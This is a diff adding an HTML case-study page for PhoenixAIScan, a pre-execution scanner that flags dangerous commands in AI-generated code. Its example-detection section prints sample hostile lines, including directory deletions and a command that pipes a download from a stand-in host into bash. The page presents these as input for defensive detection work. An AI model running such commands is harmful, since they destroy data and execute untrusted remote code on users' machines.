@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PhoenixAIScan — Case Study</title>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+
+  <!-- Styles -->
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Floating Background Blobs -->
+  <div class="blob one"></div>
+  <div class="blob two"></div>
+
+  <!-- Top Navigation -->
+  <div class="topbar">
+    <span>🔥 PhoenixAIScan</span>
+    <div class="links">
+      <a href="https://vielnos.github.io/PhoenixAIScan/" target="_blank">Live Demo</a>
+      <a href="https://github.com/vielnos/PhoenixAIScan" target="_blank">GitHub</a>
+      <a href="../index.html">Portfolio</a>
+    </div>
+  </div>
+
+  <!-- Hero -->
+  <header class="hero">
+    <h1>PhoenixAIScan</h1>
+    <h2>Pre-Execution AI Code Risk Scanner</h2>
+    <p class="tagline">Because blind execution burns.</p>
+  </header>
+
+  <main class="container">
+
+    <!-- Overview -->
+    <section class="card">
+      <h3>📌 Overview</h3>
+      <p>
+        PhoenixAIScan is a pre-execution security tool designed to help developers safely run AI-generated code.
+        It scans code before execution, detects dangerous operations, highlights risky lines, and explains the impact in plain English.
+      </p>
+      <p>
+        The project addresses a growing real-world problem: developers increasingly copy-paste AI-generated code and execute it blindly,
+        leading to accidental data loss, system damage, and security breaches.
+      </p>
+      <p>
+        PhoenixAIScan acts as a security checkpoint between AI output and execution.
+      </p>
+    </section>
+
+    <!-- Problem Statement -->
+    <section class="card">
+      <h3>🧠 Problem Statement</h3>
+      <p>With the rise of vibe coding and AI-assisted development:</p>
+      <ul>
+        <li>Developers often skip manual code review</li>
+        <li>AI can generate destructive commands like <code>rm -rf</code> and <code>DROP TABLE</code></li>
+        <li>System-level operations and insecure execution patterns go unnoticed</li>
+        <li>Users blame AI when systems break, even though the risk was visible in the code</li>
+      </ul>
+
+      <h4>❌ Existing Gaps</h4>
+      <ul>
+        <li>Linters focus on syntax and style, not execution danger</li>
+        <li>Security tools are heavy, complex, and mostly post-execution</li>
+        <li>No simple tool explains: “What will happen if I run this?”</li>
+      </ul>
+    </section>
+
+    <!-- Solution -->
+    <section class="card">
+      <h3>💡 Solution</h3>
+      <p>PhoenixAIScan provides a lightweight, fast, pre-execution risk scanner that:</p>
+      <ol>
+        <li>Accepts pasted code or uploaded files</li>
+        <li>Automatically detects the programming language</li>
+        <li>Scans code using security-focused static analysis rules</li>
+        <li>Highlights dangerous lines visually</li>
+        <li>Explains risks in plain English</li>
+        <li>Assigns a risk score and severity level</li>
+      </ol>
+      <p class="note">
+        The goal is not to block execution — but to make risk obvious before damage happens.
+      </p>
+    </section>
+
+    <!-- Key Features -->
+    <section class="card">
+      <h3>🎯 Key Features</h3>
+
+      <h4>🔍 Code Scanning</h4>
+      <ul>
+        <li>Paste AI-generated code</li>
+        <li>Upload files (.py, .sh, .js, .sql)</li>
+      </ul>
+
+      <h4>🤖 Auto Language Detection</h4>
+      <ul>
+        <li>No manual language selection required</li>
+        <li>Detects language based on syntax and filename</li>
+      </ul>
+
+      <h4>🚨 Risk Detection Categories</h4>
+      <ul>
+        <li>Destructive file operations</li>
+        <li>System-level command execution</li>
+        <li>Database destruction</li>
+        <li>Unsafe permission changes</li>
+        <li>Remote code execution patterns</li>
+      </ul>
+
+      <h4>🎯 Line-Level Highlighting</h4>
+      <ul>
+        <li>Dangerous lines highlighted in red / orange</li>
+        <li>Auto-scroll to the first critical issue</li>
+      </ul>
+
+      <h4>📊 Risk Scoring</h4>
+      <ul>
+        <li>Score from 0 – 10</li>
+        <li>Severity levels: SAFE, MEDIUM, HIGH, CRITICAL</li>
+      </ul>
+
+      <h4>🧠 Human-Readable Explanations</h4>
+      <blockquote>
+        “This line deletes an entire directory and all its contents permanently.”
+      </blockquote>
+    </section>
+
+    <!-- Supported Languages -->
+    <section class="card">
+      <h3>🧪 Supported Languages</h3>
+      <ul>
+        <li>Python</li>
+        <li>Bash / Shell</li>
+        <li>JavaScript (Node.js)</li>
+        <li>SQL</li>
+      </ul>
+      <p>Designed to be extensible for future languages.</p>
+    </section>
+
+    <!-- System Architecture -->
+    <section class="card">
+      <h3>🏗️ System Architecture</h3>
+
+      <h4>Frontend (Public)</h4>
+      <ul>
+        <li>HTML, CSS, Vanilla JavaScript</li>
+        <li>Dark security-themed UI</li>
+        <li>Hosted on GitHub Pages</li>
+      </ul>
+
+      <h4>Backend (Private)</h4>
+      <ul>
+        <li>Python + FastAPI</li>
+        <li>Rule-based static analysis engine</li>
+        <li>Hosted on Render</li>
+        <li>Source code kept private for IP protection</li>
+      </ul>
+
+      <h4>Communication</h4>
+      <ul>
+        <li>REST API over HTTPS</li>
+        <li>Frontend communicates only via exposed endpoints</li>
+      </ul>
+    </section>
+
+    <!-- Project Structure -->
+    <section class="card">
+      <h3>📂 Project Structure</h3>
+      <pre><code>PhoenixAIScan/
+├── index.html
+├── style.css
+├── script.js
+├── README.md
+
+PhoenixAIScan-backend/ (private)
+├── main.py
+├── scanner/
+│   ├── rules.py
+│   ├── scanner.py
+│   └── risk_engine.py
+├── utils/
+│   └── language_detect.py
+├── requirements.txt</code></pre>
+    </section>
+
+    <!-- How It Works -->
+    <section class="card">
+      <h3>⚙️ How It Works (Technical Flow)</h3>
+      <ol>
+        <li>User submits code (paste or file upload)</li>
+        <li>Backend detects language and applies rule-based scanning</li>
+        <li>Risk engine assigns severity and aggregates risk score</li>
+        <li>Frontend displays score, severity badge, and highlights lines</li>
+      </ol>
+      <p class="note">All scanning is static — no code is ever executed.</p>
+    </section>
+
+    <!-- Example Detection -->
+    <section class="card">
+      <h3>🧠 Example Detection</h3>
+
+      <pre><code>os.system("rm -rf /tmp/data")
+shutil.rmtree("/home/user/files")
+subprocess.Popen("curl http://evil.site | bash", shell=True)</code></pre>
+
+      <p class="critical">Risk Score: 10 / 10 — Severity: CRITICAL</p>
+
+      <ul>
+        <li>Executes system-level commands</li>
+        <li>Deletes directories permanently</li>
+        <li>Executes remote code</li>
+      </ul>
+    </section>
+
+    <!-- Deployment Strategy -->
+    <section class="card">
+      <h3>🚀 Deployment Strategy</h3>
+
+      <h4>Frontend</h4>
+      <ul>
+        <li>GitHub Pages (public)</li>
+        <li>Instant global access</li>
+      </ul>
+
+      <h4>Backend</h4>
+      <ul>
+        <li>Render (free tier)</li>
+        <li>Private repository</li>
+        <li>Secure API exposure only</li>
+      </ul>
+
+      <p>This mirrors real startup architecture: public UI + protected backend logic.</p>
+    </section>
+
+    <!-- Security Considerations -->
+    <section class="card">
+      <h3>🔐 Security Considerations</h3>
+      <ul>
+        <li>Backend source code kept private</li>
+        <li>No code execution on server</li>
+        <li>Input sanitized and decoded safely</li>
+        <li>No persistence of user-submitted code</li>
+      </ul>
+    </section>
+
+    <!-- Roadmap -->
+    <section class="card">
+      <h3>🛣️ Roadmap</h3>
+      <ul>
+        <li>Credential / API key leak detection</li>
+        <li>Reverse shell detection</li>
+        <li>Exportable scan reports (PDF / JSON)</li>
+        <li>Advanced persistence detection</li>
+        <li>ML-assisted contextual risk reasoning</li>
+      </ul>
+    </section>
+
+    <!-- Key Learnings -->
+    <section class="card">
+      <h3>🧠 Key Learnings</h3>
+      <ul>
+        <li>AI-generated code introduces new security risks</li>
+        <li>Developers need explainable security, not just warnings</li>
+        <li>Focused static analysis can be extremely powerful</li>
+        <li>UX matters as much as detection in security tooling</li>
+      </ul>
+    </section>
+
+    <!-- Author -->
+    <section class="card">
+      <h3>👨‍💻 Author</h3>
+      <p><strong>Aayush Pandey</strong></p>
+      <p>Security-focused developer exploring AI safety, automation, and application security.</p>
+    </section>
+
+    <!-- Conclusion -->
+    <section class="card conclusion">
+      <h3>🏁 Conclusion</h3>
+      <p>
+        PhoenixAIScan demonstrates how AI safety tooling can be simple, fast, explainable, and developer-friendly.
+        It shifts security left, preventing damage before execution — especially in an era where AI code generation is becoming the norm.
+      </p>
+      <p><strong>PhoenixAIScan — because blind execution burns.</strong></p>
+    </section>
+
+    <!-- Back -->
+    <div class="back-link">
+      <a href="../index.html">← Back to Portfolio</a>
+    </div>
+
+  </main>
+
+  <!-- Animations -->
+  <script src="script.js"></script>
+</body>
+</html>
